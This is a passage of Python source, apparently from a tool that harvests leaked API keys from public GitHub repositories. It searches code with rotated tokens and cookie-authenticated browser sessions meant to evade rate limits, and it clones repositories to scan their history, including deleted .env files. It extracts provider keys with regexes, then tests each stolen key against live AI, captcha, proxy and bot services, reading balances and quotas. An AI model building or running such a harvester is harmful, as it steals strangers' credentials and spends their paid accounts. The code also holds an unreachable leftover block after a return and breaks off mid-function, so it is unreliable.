# --------------------------------------------------------------------------- #
WEB_SESSIONS: List[requests.Session] = []
_ws_lock = threading.Lock()


def _load_web_sessions() -> None:
    """Load cookie-authed sessions from gh_sessions.json.

    These bypass the REST API rate limit (no token needed) and can run
    in parallel with the token-based REST search → ~5x throughput.
    """
    global WEB_SESSIONS
    sessions_file = PROJ / "gh_sessions.json"
    try:
        with open(sessions_file, "r", encoding="utf-8") as f:
            data = json_module.load(f)
    except Exception as e:
        log.debug("no gh_sessions.json: %r", e)
        return
    loaded: List[requests.Session] = []
    for sd in data:
        ws = requests.Session()
        ws.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36"})
        for name, value in sd.items():
            try:
                ws.cookies.set(name, value, domain=".github.com")
            except Exception:
                pass
        loaded.append(ws)
    WEB_SESSIONS = loaded
    if loaded:
        log.info("Loaded %d web sessions (parallel search enabled)",
                 len(loaded))


# late import to keep top of file clean
import json as json_module  # noqa: E402
_load_web_sessions()

# --------------------------------------------------------------------------- #
# HTTP session pool — keep-alive, shared
# --------------------------------------------------------------------------- #
class HttpPool:
    """Thread-local session pool with connection reuse.

    Per-thread session → each thread keeps its own keep-alive pool,
    avoiding cross-thread connection contention. Pool size scales with
    the number of workers so 200 threads each get their own connection
    instead of queuing on a shared 50-conn pool.
    """
    def __init__(self) -> None:
        self._local = threading.local()

    def session(self) -> requests.Session:
        s = getattr(self._local, "session", None)
        if s is None:
            s = requests.Session()
            # Apply the one-time proxy decision (computed at module load).
            if _USE_DIRECT:
                s.trust_env = False
            # Generous pool: each thread's session can hold many connections
            # to different hosts (api.github.com, raw.githubusercontent.com, etc.)
            a = requests.adapters.HTTPAdapter(
                pool_connections=10, pool_maxsize=10, max_retries=0)
            s.mount("https://", a)
            s.mount("http://", a)
            s.headers.update({"User-Agent": "Mozilla/5.0"})
            self._local.session = s
        return s


# --------------------------------------------------------------------------- #
# Proxy liveness — checked ONCE at module load (before HttpPool is created).
# If HTTP_PROXY/HTTPS_PROXY points to a dead local proxy (v2ray/clash down),
# we disable proxy usage so requests connect directly.
# --------------------------------------------------------------------------- #
_USE_DIRECT = False
_proxy_url = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "")
if _proxy_url.startswith("http://127.0.0.1") or _proxy_url.startswith("http://localhost"):
    try:
        import urllib.parse as _up
        import socket as _socket
        _p = _up.urlparse(_proxy_url)
        _sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        _sock.settimeout(1)
        _sock.connect((_p.hostname or "127.0.0.1", _p.port or 8080))
        _sock.close()
    except Exception:
        _USE_DIRECT = True
        log.warning("[NET] Proxy %s unreachable — switching to direct mode",
                    _proxy_url)


HTTP = HttpPool()

# --------------------------------------------------------------------------- #
# Exponential backoff helper
# --------------------------------------------------------------------------- #
def _backoff(attempt: int) -> float:
    """Exponential backoff with jitter. attempt is 0-based."""
    return min(60.0, 2.0 ** attempt) + (time.time() % 1.0)

# --------------------------------------------------------------------------- #
# Search
# --------------------------------------------------------------------------- #
def gh_search(q: str) -> List[dict]:
    """gh CLI fallback (slow)."""
    for attempt in range(3):
        if _stopped():
            return []
        try:
            r = subprocess.run(
                ['gh', 'search', 'code', q, '--limit', '100',
                 '--json', 'repository,path'],
                capture_output=True, text=True, timeout=25,
                encoding='utf-8', errors='replace')
            if r.returncode == 0 and r.stdout.strip():
                import json
                try:
                    return json.loads(r.stdout)
                except Exception:
                    return []
            return []
        except subprocess.TimeoutExpired:
            time.sleep(_backoff(attempt))
        except Exception as e:
            log.debug("gh_search error: %r", e)
            time.sleep(_backoff(attempt))
    return []


# ETag cache for search queries (v10) — saves rate limit on repeat queries.
# Key: (query, page), Value: (etag, items).
_etag_cache: Dict[Tuple[str, int], Tuple[str, List[dict]]] = {}
_etag_cache_lock = threading.Lock()
_ETAG_CACHE_MAX = 5000


def rest_search_token(q: str, max_pages: int = 2,
                      page_offset: int = 0) -> List[dict]:
    """REST API code search with token rotation + ETag caching (v10).

    page_offset: rotate starting page across cycles.
    sort=indexed: fresher results.
    ETag: repeat queries return 304 (cached) → no rate limit cost.
    """
    all_items: List[dict] = []
    for i in range(max_pages):
        if _stopped():
            break
        page = page_offset + i + 1
        cache_key = (q, page)

        # Check ETag cache — if we have a cached response, try If-None-Match.
        cached = None
        etag = None
        with _etag_cache_lock:
            cached_entry = _etag_cache.get(cache_key)
            if cached_entry:
                etag, cached = cached_entry

        tok = TOKENS.next()
        if not tok:
            break
        try:
            headers = {"Authorization": f"token {tok}",
                       "Accept": "application/vnd.github.v3+json"}
            if etag:
                headers["If-None-Match"] = etag
            r = HTTP.session().get(
                "https://api.github.com/search/code",
                params={"q": q, "per_page": 100, "page": page,
                        "sort": "indexed", "order": "desc"},
                headers=headers,
                timeout=(5, 8))
            if r.status_code == 200:
                items = r.json().get("items", [])
                if not items:
                    break
                parsed = []
                for item in items:
                    parsed.append({
                        "repository": {
                            "nameWithOwner": item.get(
                                "repository", {}).get("full_name", "")},
                        "path": item.get("path", "")})
                all_items.extend(parsed)
                # Cache with ETag for future cycles.
                new_etag = r.headers.get("ETag")
                if new_etag:
                    with _etag_cache_lock:
                        _etag_cache[cache_key] = (new_etag, parsed)
                        if len(_etag_cache) > _ETAG_CACHE_MAX:
                            _etag_cache.clear()
            elif r.status_code == 304:
                # Not modified — use cached results (FREE, no rate limit cost).
                if cached:
                    all_items.extend(cached)
            elif r.status_code == 401:
                TOKENS.mark_dead(tok)
                break
            elif r.status_code == 403:
                break
            else:
                break
        except requests.RequestException as e:
            log.debug("rest_search %s p%d: %r", q[:30], page, e)
            break
        except Exception as e:
            log.debug("rest_search %s p%d: %r", q[:30], page, e)
            break
    return all_items


def web_search(session: requests.Session, query: str) -> List[dict]:
    """Search code via web session — bypasses REST API rate limit.

    Parses result HTML instead of JSON. Each session acts as a distinct
    browser, so 5 sessions = 5 parallel searches with no token burn.
    """
    from urllib.parse import quote
    url = f"https://github.com/search?q={quote(query)}&type=code"
    try:
        r = session.get(url, timeout=15)
        if r.status_code != 200:
            return []
        results: List[dict] = []
        matches = re.findall(
            r'href="(/[^/]+/[^/]+/blob/[^"]+)"', r.text)
        seen: Set[str] = set()
        for m in matches:
            parts = m.strip('/').split('/blob/')
            if len(parts) != 2:
                continue
            repo = parts[0]
            rest = parts[1].split('/', 1)
            if len(rest) != 2:
                continue
            filepath = rest[1]
            key = f"{repo}/{filepath}"
            if key in seen:
                continue
            seen.add(key)
            results.append({
                "repository": {"nameWithOwner": repo},
                "path": filepath,
            })
        return results
    except Exception as e:
        log.debug("web_search %s: %r", query[:30], e)
        return []


def web_search_parallel(queries: List[str]) -> Dict[str, List[dict]]:
    """Run web searches in parallel across all sessions (round-robin)."""
    if not WEB_SESSIONS or not queries:
        return {}
    all_results: Dict[str, List[dict]] = {}
    n = len(WEB_SESSIONS)
    with ThreadPoolExecutor(max_workers=n) as ex:
        futs = {}
        for i, q in enumerate(queries):
            session = WEB_SESSIONS[i % n]
            futs[ex.submit(web_search, session, q)] = q
        for f in as_completed(futs):
            q = futs[f]
            try:
                all_results[q] = f.result()
            except Exception:
                all_results[q] = []
    return all_results


# --------------------------------------------------------------------------- #
# Raw file scan — mark_scanned moved to END
# --------------------------------------------------------------------------- #
def scan_raw_file(repo: str, path: str) -> Dict[str, Set[Tuple[str, str]]]:
    """Download raw file, extract keys. Marks scanned only on success."""
    add_known_repo(repo, "raw")
    found: Dict[str, Set[Tuple[str, str]]] = {}
    success = False
    for br in ('main', 'master', 'HEAD', 'dev'):
        if _stopped():
            break
        try:
            r = HTTP.session().get(
                f'https://raw.githubusercontent.com/{repo}/{br}/{path}',
                timeout=8)
            if r.status_code == 200:
                results = _extract_keys(r.text)
                # Entropy pass — catches unknown-format keys.
                for pn, keys in _extract_entropy_keys(r.text).items():
                    results.setdefault(pn, set()).update(keys)
                for pn, keys in results.items():
                    for k in keys:
                        found.setdefault(pn, set()).add((k, repo))
                success = True
                break
        except requests.RequestException as e:
            log.debug("raw %s/%s %s: %r", repo, path, br, e)
            continue
        except Exception as e:
            log.debug("raw %s/%s %s: %r", repo, path, br, e)
            continue
    # Only mark scanned if we actually fetched it.
    if success:
        mark_scanned(repo, path)
    return found


def _is_skip(match: str) -> bool:
    """Tighter SKIP filter — don't kill valid long keys for short substrings.

    v9 bug: '1234567890' in SKIP killed any key containing that substring,
    even a real 48-char key that happened to contain it. v10 only rejects:
      - exact match against a SKIP word
      - keys shorter than 10 chars
      - keys that START with a short SKIP word + separator (e.g. 'sk-xxx')
    """
    mlow = match.lower()
    if len(match) < 10:
        return True
    if mlow in SKIP:
        return True
    # Only check short SKIP words (<=8 chars) as prefixes with separator.
    for s in SKIP:
        if len(s) <= 8 and (mlow == s or mlow.startswith(s + '.')
                            or mlow.startswith(s + '-')):
            return True
    return False


# Context hints — a key is real only if near one of these (±50 chars).
CONTEXT_HINTS = ('api_key', 'apikey', 'api-key', 'token', 'secret',
                 'password', 'auth', 'bearer', 'credential',
                 'access_key', 'accesskey', 'private_key')


def _has_context(text: str, pos: int, length: int, window: int = 50) -> bool:
    """Check if there's a CONTEXT_HINT within ±window chars of the match."""
    start = max(0, pos - window)
    end = min(len(text), pos + length + window)
    snippet = text[start:end].lower()
    return any(h in snippet for h in CONTEXT_HINTS)


def _extract_keys(text: str, require_context: bool = False
                  ) -> Dict[str, Set[str]]:
    """Run all provider regexes over text, return prov -> set(keys).

    v10 improvements:
      - _is_skip: tighter filter (doesn't kill long keys for short substrings)
      - require_context: if True, only count matches near CONTEXT_HINTS
      - Context-aware routing: if DEEPSEEK_API_KEY is near a sk- key,
        route to DEEPSEEK not DASHSCOPE (they share the same format).
    """
    # Context hints → provider override (for keys with shared formats).
    _CONTEXT_ROUTING = {
        'DEEPSEEK_API_KEY': 'DEEPSEEK',
        'DEEPSEEK_KEY': 'DEEPSEEK',
        'DS_API_KEY': 'DEEPSEEK',
        'DASHSCOPE_API_KEY': 'DASHSCOPE',
        'QWEN_API_KEY': 'DASHSCOPE',
        'QWEN_DASHSCOPE_API_KEY': 'DASHSCOPE',
        'TONGYI_QIANWEN_API_KEY': 'DASHSCOPE',
        'QIANWEN_API_KEY': 'DASHSCOPE',
        'ALIYUN_QWEN_API_KEY': 'DASHSCOPE',
        'ALIBABA_QWEN_API_KEY': 'DASHSCOPE',
        'ALIBABACLOUD_API_KEY': 'DASHSCOPE',
        'ALIYUN_CLOUD_API_KEY': 'DASHSCOPE',
        'ALICLOUD_API_KEY': 'DASHSCOPE',
        'ALIYUN_LLM_API_KEY': 'DASHSCOPE',
        'BAILIAN_API_KEY': 'DASHSCOPE',
        'BAILIAN_API_TOKEN': 'DASHSCOPE',
        'MODELSCOPE_API_KEY': 'DASHSCOPE',
        'MODELSCOPE_TOKEN': 'DASHSCOPE',
        'DASHSCOPE_LLM_API_KEY': 'DASHSCOPE',
        'ZHIPU_API_KEY': 'ZAI',
        'Z_AI_API_KEY': 'ZAI',
        'ZAI_API_KEY': 'ZAI',
        'GLM_API_KEY': 'ZAI',
    }

    def _get_context_provider(text: str, pos: int) -> str:
        """Check if a context hint before this position overrides provider."""
        # Look 80 chars before the key for env var name.
        before = text[max(0, pos - 80):pos].upper()
        for hint, prov in _CONTEXT_ROUTING.items():
            if hint.upper() in before:
                return prov
        return ""

    results: Dict[str, Set[str]] = {}
    for pn, p in PROVIDERS.items():
        regex = p["regex"]
        matches = regex.findall(text)
        if regex.groups > 1:
            matches = [m[0] if isinstance(m, tuple) else m for m in matches]
        for m in matches:
            if not m or _is_skip(m):
                continue
            if require_context:
                pos = text.find(m)
                if pos < 0 or not _has_context(text, pos, len(m)):
                    continue
            # Context-aware routing: check if env var name nearby
            # overrides the provider (e.g. DEEPSEEK_API_KEY → DEEPSEEK).
            pos = text.find(m)
            ctx_prov = _get_context_provider(text, pos) if pos >= 0 else ""
            final_prov = ctx_prov if ctx_prov else pn
            results.setdefault(final_prov, set()).add(m)
    return results


# === ENTROPY DETECTION (v10) ===
# Catches keys without a known prefix/format (new providers, custom tokens).
# Based on TruffleHog approach: high Shannon entropy = likely a secret.

# Tokens that look like API keys: 32-64 chars, alnum + -_.
_ENTROPY_RE = re.compile(r'\b([A-Za-z0-9_-]{32,64})\b')
_ENTROPY_THRESHOLD = 4.5  # bits per char; high bar cuts ~80% false positives


def _shannon_entropy(s: str) -> float:
    """Shannon entropy in bits per character."""
    if not s:
        return 0.0
    freq = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


def _extract_entropy_keys(text: str) -> Dict[str, Set[str]]:
    """Find keys by PREFIX matching only (entropy disabled — too many FPs).

    Generic entropy detection (4.0/4.2/4.5 thresholds) all produced 77-94%
    false positives. AI keys have known prefixes, so we detect by prefix
    instead of entropy. This catches keys that v9 regex misses because the
    provider is disabled (e.g. GROQ gsk_ prefix) or the regex is too narrow.
    """
    # Prefix patterns → provider mapping.
    _PREFIX_PATTERNS = [
        # (regex, provider_name)
        # GROQ removed — free tier junk
        (r'pplx-[a-z0-9]{40,60}', 'PERPLEXITY'),
        (r'nvapi-[A-Za-z0-9_-]{80,120}', 'NVIDIA'),
        (r'r8_[A-Za-z0-9]{30,45}', 'REPLICATE'),
        (r'fish_[a-f0-9]{50,70}', 'SAKANA'),
        (r'sk-or-[A-Za-z0-9-]{30,80}', 'OPENROUTER'),
        (r'CAP-[A-Za-z0-9_-]{20,45}', 'CAPSOLVER'),
    ]
    results: Dict[str, Set[str]] = {}
    # Collect already-found keys to dedup.
    existing = _extract_keys(text)
    existing_flat = set()
    for keys in existing.values():
        existing_flat.update(keys)

    for pattern, prov_name in _PREFIX_PATTERNS:
        for m in re.findall(pattern, text):
            if m in existing_flat or _is_skip(m):
                continue
            results.setdefault(prov_name, set()).add(m)
    return results
    results: Dict[str, Set[str]] = {}
    # Collect all already-found keys to dedup.
    existing = _extract_keys(text)
    existing_flat = set()
    for keys in existing.values():
        existing_flat.update(keys)

    # Known non-key patterns to reject (hashes, SRI, commit IDs, non-AI tokens).
    _REJECT_PREFIXES = ('sha256-', 'sha384-', 'sha512-', 'sha1-',
                        'base64-', 'urn:', 'arn:',
                        # Non-AI tokens (measured false positives)
                        'AIza',      # Google API keys (GitHub auto-revokes)
                        'AZUR',      # Azure connection strings
                        'SUB_',      # Subscription IDs
                        'c3Jj',      # base64-encoded "src" (SRI)
                        'ghp_',      # GitHub PAT (GitHub auto-revokes)
                        'gho_',      # GitHub OAuth
                        'ghu_',      # GitHub user
                        'ghs_',      # GitHub server
                        'xox',       # Slack tokens
                        'AKIA',      # AWS keys
                        'ya29',      # Google OAuth
                        'eyJh',      # JWT header start
                        'eyJl',      # JWT
                        'bafk',      # IPFS CID
                        'Qm',        # IPFS
                        )
    _REJECT_EXACT = re.compile(
        r'^[0-9a-f]{40}$|'          # git SHA-1
        r'^[0-9a-f]{64}$|'          # SHA-256 hex
        r'^[0-9a-f]{32}-[0-9a-f]+$|'# UUID-like
        r'^[A-Za-z0-9+/]{43}=$|'   # base64 SHA
        r'^[A-Za-z0-9+/]{88}=$',   # long base64 blob
        re.IGNORECASE)
    # Reject if contains non-key substrings (session tokens, model names, etc.).
    _REJECT_SUBSTRINGS = ('sess', 'sub_', 'subscription', 'connection',
                          'postgresql', 'mongodb', 'mysql', 'redis',
                          'amqp', 'password', 'jdbc',
                          # Model/contract names (measured false positives)
                          'apipub', 'response', 'contract', 'address',
                          'llama-', 'mistral-', 'gpt-', 'claude-',
                          'instruct', 'maverick', 'cascade', 'nft',
                          )

    for m in _ENTROPY_RE.findall(text):
        if m in existing_flat or _is_skip(m):
            continue
        # Reject known hash/SRI/non-AI patterns.
        if any(m.startswith(p) for p in _REJECT_PREFIXES):
            continue
        if _REJECT_EXACT.match(m):
            continue
        # Reject connection strings / session tokens (substring check).
        mlow = m.lower()
        if any(s in mlow for s in _REJECT_SUBSTRINGS):
            continue
        if _shannon_entropy(m) < _ENTROPY_THRESHOLD:
            continue
        # Context check — entropy alone has too many false positives.
        pos = text.find(m)
        if pos < 0 or not _has_context(text, pos, len(m)):
            continue
        results.setdefault("GENERIC_HIGH_ENTROPY", set()).add(m)
    return results


def _extract_keys_windowed(text: str) -> Dict[str, Set[str]]:
    """Scan large text in overlapping windows so keys aren't split."""
    cap = CONFIG["git_log_max_chars"]
    if len(text) <= cap:
        # Merge regex results + entropy results.
        results = _extract_keys(text)
        for pn, keys in _extract_entropy_keys(text).items():
            results.setdefault(pn, set()).update(keys)
        return results
    results: Dict[str, Set[str]] = {}
    pos = 0
    while pos < len(text) and not _stopped():
        chunk = text[pos: pos + cap]
        sub = _extract_keys(chunk)
        for pn, keys in sub.items():
            results.setdefault(pn, set()).update(keys)
        # Entropy pass on this chunk too.
        for pn, keys in _extract_entropy_keys(chunk).items():
            results.setdefault(pn, set()).update(keys)
        # Overlap by max key length so a key straddling the boundary is caught.
        pos += cap - _MAX_KEY_LEN
    return results

# --------------------------------------------------------------------------- #
# Git clone + history scan
# --------------------------------------------------------------------------- #
def get_repo_size(repo: str) -> int:
    """KB. Uses token rotation."""
    tok = TOKENS.next()
    headers = {"Accept": "application/vnd.github.v3+json"}
    if tok:
        headers["Authorization"] = f"token {tok}"
    try:
        r = HTTP.session().get(f"https://api.github.com/repos/{repo}",
                               headers=headers, timeout=5)
        if r.status_code == 200:
            return int(r.json().get("size", 0))
        if r.status_code == 401 and tok:
            TOKENS.mark_dead(tok)
    except Exception as e:
        log.debug("get_repo_size %s: %r", repo, e)
    return 0


def force_delete(path: Path) -> None:
    """Force-delete a dir on Windows — no shell=True."""
    if not path.exists():
        return
    # Clear read-only attrs that block rmtree on Windows.
    def _on_error(func, p, _exc):
        try:
            os.chmod(p, 0o777)
            func(p)
        except Exception:
            pass
    try:
        shutil.rmtree(path, onerror=_on_error)
    except Exception as e:
        log.debug("force_delete %s: %r", path, e)


def _kill_proc(proc: subprocess.Popen) -> None:
    """Kill a process tree (Windows)."""
    try:
        subprocess.run(
            ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
            capture_output=True, timeout=10)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def clone_and_scan_git(repo: str) -> Dict[str, Set[Tuple[str, str]]]:
    """Clone shallow, scan git history for keys."""
    repo_safe = re.sub(r'[^A-Za-z0-9._-]', '_', repo.replace("/", "_"))
    repo_dir = CLONE_DIR / repo_safe
    found: Dict[str, Set[Tuple[str, str]]] = {pn: set() for pn in PROVIDERS}

    force_delete(repo_dir)

    if _stopped():
        return found

    # Shallow clone — use --shallow-since for deeper history coverage.
    # --depth 50 catches recent commits; --shallow-since="6 months ago"
    # catches ALL commits in the last 6 months (where most leaked keys live
    # before being rotated). Trade-off: slightly bigger clone, much better yield.
    try:
        proc = subprocess.Popen(
            ["git", "clone", "--shallow-since=6 months ago",
             "--no-tags", f"https://github.com/{repo}.git", str(repo_dir)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=_NEWPG)
        try:
            proc.wait(timeout=20)
        except subprocess.TimeoutExpired:
            _kill_proc(proc)
            force_delete(repo_dir)
            return found
        if proc.returncode != 0:
            # Fallback: try shallow depth clone if shallow-since failed
            # (e.g. new repo with no commits 6mo ago).
            proc = subprocess.Popen(
                ["git", "clone", "--depth", str(CONFIG["git_depth"]),
                 "--no-tags", f"https://github.com/{repo}.git", str(repo_dir)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=_NEWPG)
            try:
                proc.wait(timeout=15)
            except subprocess.TimeoutExpired:
                _kill_proc(proc)
                force_delete(repo_dir)
                return found
            if proc.returncode != 0:
                force_delete(repo_dir)
                return found
    except Exception as e:
        log.debug("clone %s: %r", repo, e)
        force_delete(repo_dir)
        return found

    # Scan git history — BOTH additions (A) and deletions (D).
    # Many leaked keys live in files that were later DELETED (someone
    # pushed .env then removed it). Without --diff-filter=AD we miss them.
    try:
        proc2 = subprocess.Popen(
            ["git", "-C", str(repo_dir), "log", "--all", "-p", "--no-color",
             "--diff-filter=AD",
             "--", "*.env", "*.env.*", "*.py", "*.json", "*.yaml", "*.yml",
             "*.js", "*.ts", "*.sh", "*.toml", "*.ini", "*.cfg"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            creationflags=_NEWPG)
        try:
            stdout, _ = proc2.communicate(timeout=20)
            text = stdout.decode('utf-8', errors='replace')
            results = _extract_keys_windowed(text)
            for pn, keys in results.items():
                for k in keys:
                    if not any(s in k.lower() for s in SKIP):
                        found.setdefault(pn, set()).add((k, repo))
        except subprocess.TimeoutExpired:
            _kill_proc(proc2)
    except Exception as e:
        log.debug("git log %s: %r", repo, e)

    force_delete(repo_dir)
    return found


def cleanup_clones() -> None:
    if not CLONE_DIR.exists():
        return
    for d in CLONE_DIR.iterdir():
        if d.is_dir():
            force_delete(d)
        elif d.suffix == ".json":
            try:
                d.unlink()
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# Validation — dispatch table + small validators
# --------------------------------------------------------------------------- #
ValidatorResult = Tuple[str, str, str, str]  # status, plan, price, remaining


def _v_captcha_get(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().get(prov["test_url"],
                               params={"key": key, "action": "getbalance"},
                               timeout=10)
        txt = r.text.strip()
        if "OK|" in txt:
            bal = txt.replace("OK|", "").strip()
            return "WORKING", "PAYG", "$" + bal, bal
        if "ERROR" in txt:
            return "DEAD", "", "", ""
        try:
            return "WORKING", "PAYG", "$" + str(float(txt)), str(float(txt))
        except ValueError:
            return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_captcha_post(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().post(prov["test_url"],
                                json={"clientKey": key}, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("errorId") == 0:
                bal = str(data.get("balance", "?"))
                return "WORKING", "PAYG", "$" + bal, bal
            return "DEAD", "", "", ""
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_webshare(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().get(
            prov["test_url"],
            headers={"Authorization": f"Token {key}"}, timeout=15)
        if r.status_code == 200:
            count = r.json().get("count", "?")
            return "WORKING", "PROXY", f"{count} proxies", str(count)
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_iproyal(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().get(
            prov["test_url"],
            headers={"Authorization": f"Bearer {key}"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            bal = str(data.get("balance", data.get("remaining", "?")))
            return "WORKING", "PROXY_API", "$" + bal, bal
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_brightdata(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().post(
            prov["test_url"],
            headers={"Authorization": f"Bearer {key}",
                     "Content-Type": "application/json"},
            json={"zone": "static"}, timeout=10)
        if r.status_code == 200:
            return "WORKING", "PROXY_API", "active", "yes"
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_replicate(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().get(
            prov["test_url"],
            headers={"Authorization": f"Token {key}"}, timeout=10)
        if r.status_code == 200:
            uname = r.json().get("username", "?")
            return "WORKING", "AI", uname, uname
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_telegram(prov: dict, key: str) -> ValidatorResult:
    try:
        r = HTTP.session().get(
            f"https://api.telegram.org/bot{key}/getMe", timeout=5)
        if r.status_code == 200 and r.json().get("ok"):
            bot = r.json()["result"]
            uname = bot.get("username", "?")
            return "WORKING", "BOT", uname, uname
        return "DEAD", "", "", ""
    except Exception:
        return "DEAD", "", "", ""


def _v_discord(_prov: dict, _key: str) -> ValidatorResult:
    return "DEAD", "", "", ""


def _v_default(prov: dict, key: str, prov_name: str) -> ValidatorResult:
    """AI providers — POST chat completion. STRICT validation:

    For ZAI/DASHSCOPE (priority): verify the FLAGSHIP model actually
    responds (parse the JSON for a real assistant message), not just
    HTTP 200. Free/trial keys often return 200 but no real completion.

    Returns (status, model_used, plan_hint, response_snippet).
    """
    h = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
    test_model = prov["test_model"]
    payload = {"model": test_model,
               "messages": [{"role": "user", "content": "Say OK"}],
               "max_tokens": 30}
    if prov.get("zai_coding"):
        payload["max_tokens"] = 200
        payload["thinking"] = {"type": "disabled"}
    status = "DEAD"
    model_used = ""
    snippet = ""
    try:
        r = HTTP.session().post(prov["test_url"], headers=h, json=payload,
                                timeout=CONFIG["validate_timeout"])
        if r.status_code == 200:
            if prov.get("check_body") and "login fail" in r.text.lower():
                status = "DEAD"
            else:
                # STRICT: parse the response — is there a real completion?
                try:
                    data = r.json()
                    choices = data.get("choices", [])
                    if choices:
                        msg = choices[0].get("message", {})
                        content = msg.get("content", "")
                        # Real model returns SOME content (even "OK").
                        if content.strip():
                            status = "WORKING"
                            model_used = data.get("model", test_model)
                            snippet = content.strip()[:40]
                        else:
                            # 200 but empty content = quota exhausted / blocked.
                            status = "LIMITED"
                    else:
                        # 200 but no choices = not a real working key.
                        status = "DEAD"
                except Exception:
                    # Non-JSON 200 — trust it for non-priority providers.
                    if prov_name not in ("ZAI", "DASHSCOPE"):
                        status = "WORKING"
                        model_used = test_model
                    else:
                        status = "DEAD"
        elif r.status_code == 429:
            status = "LIMITED"
        elif r.status_code in (401, 403):
            status = "DEAD"
        elif r.status_code == 402:
            status = "FREE"
    except Exception:
        status = "ERR"

    # Generic cross-check via alt_urls (e.g. DASHSCOPE key may work on DeepSeek).
    if status == "DEAD" and prov.get("alt_urls"):
        for alt_prov_name, alt_url, alt_model in prov["alt_urls"]:
            try:
                r2 = HTTP.session().post(
                    alt_url, headers=h,
                    json={"model": alt_model,
                          "messages": [{"role": "user", "content": "Say OK"}],
                          "max_tokens": 5},
                    timeout=15)
                if r2.status_code == 200:
                    try:
                        ch = r2.json().get("choices", [])
                        if ch and ch[0].get("message", {}).get("content", "").strip():
                            return "WORKING", alt_model, "alt:" + alt_prov_name, ""
                    except Exception:
                        return "WORKING", alt_model, "alt:" + alt_prov_name, ""
            except Exception:
                continue
    return status, model_used, "", snippet


def _v_elevenlabs(prov: dict, key: str) -> ValidatorResult:
    """ElevenLabs — check user subscription (shows character quota)."""
    try:
        r = HTTP.session().get(prov["test_url"],
                               headers={"xi-api-key": key}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            sub = data.get("subscription", {})
            tier = sub.get("tier", "?")
            chars = sub.get("character_count", 0)
            limit = sub.get("character_limit", 0)
            remaining = max(0, limit - chars)
            return "WORKING", tier, f"{remaining} chars", str(remaining)
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_stability(prov: dict, key: str) -> ValidatorResult:
    """Stability AI — check balance directly."""
    try:
        r = HTTP.session().get(prov["test_url"],
                               headers={"Authorization": f"Bearer {key}",
                                        "Accept": "application/json"},
                               timeout=10)
        if r.status_code == 200:
            credits = r.json().get("credits", "?")
            return "WORKING", "PAYG", f"{credits} credits", str(credits)
        return "DEAD", "", "", ""
    except Exception:
        return "ERR", "", "", ""


def _v_aliyun(_prov: dict, _key: str) -> ValidatorResult:
    """Aliyun AccessKey ID — can't validate without secret pair. Mark NEW."""
    return "DEAD", "", "", ""


VALIDATORS = {
    "captcha_get": _v_captcha_get,
    "captcha_post": _v_captcha_post,
    "webshare": _v_webshare,
    "iproyal": _v_iproyal,
    "brightdata": _v_brightdata,
    "replicate": _v_replicate,
    "telegram": _v_telegram,
    "discord": _v_discord,
    "elevenlabs": _v_elevenlabs,
    "stability": _v_stability,
    "aliyun": _v_aliyun,
}


def _v_generic_entropy(key: str) -> ValidatorResult:
    """Universal validator for GENERIC_HIGH_ENTROPY keys.

    Tries the key against multiple provider endpoints. Many high-entropy
    keys have a prefix (gsk_, sk-, r8_, fish_) that betrays their origin.
    First we detect the prefix; if none, try a few common endpoints.
    """
    h = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
    # Prefix-based routing (fast path).
    _PREFIX_MAP = {
        # GROQ removed — free tier junk
        "sk-or-": ("OPENROUTER", "https://openrouter.ai/api/v1/chat/completions",
                    "openai/gpt-4o"),
        "sk-": ("DEEPSEEK", "https://api.deepseek.com/v1/chat/completions",
                 "deepseek-chat"),
        "r8_": ("REPLICATE", "", ""),
        "fish_": ("SAKANA", "https://api.sakana.ai/v1/chat/completions",
                   "fugu-ultra"),
    }
    for prefix, (prov_name, url, model) in _PREFIX_MAP.items():
        if key.startswith(prefix) and url:
            try:
                r = HTTP.session().post(url, headers=h,
                    json={"model": model,
                          "messages": [{"role": "user", "content": "Say OK"}],
                          "max_tokens": 5}, timeout=15)
                if r.status_code == 200:
                    return "WORKING", prov_name, f"identified as {prov_name}", ""
                if r.status_code == 429:
                    return "LIMITED", prov_name, "", ""
            except Exception:
                continue

    # No prefix match — try OpenRouter (most permissive) + DASHSCOPE.
    _GENERIC_ENDPOINTS = [
        ("OPENROUTER", "https://openrouter.ai/api/v1/chat/completions",
         "openai/gpt-4o"),
        ("DASHSCOPE",
         "https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions",
         "qwen3.7-max"),
        ("DEEPSEEK", "https://api.deepseek.com/v1/chat/completions",
         "deepseek-chat"),
    ]
    for prov_name, url, model in _GENERIC_ENDPOINTS:
        try:
            r = HTTP.session().post(url, headers=h,
                json={"model": model,
                      "messages": [{"role": "user", "content": "Say OK"}],
                      "max_tokens": 5}, timeout=15)
            if r.status_code == 200:
                return "WORKING", prov_name, f"identified as {prov_name}", ""
            if r.status_code == 429:
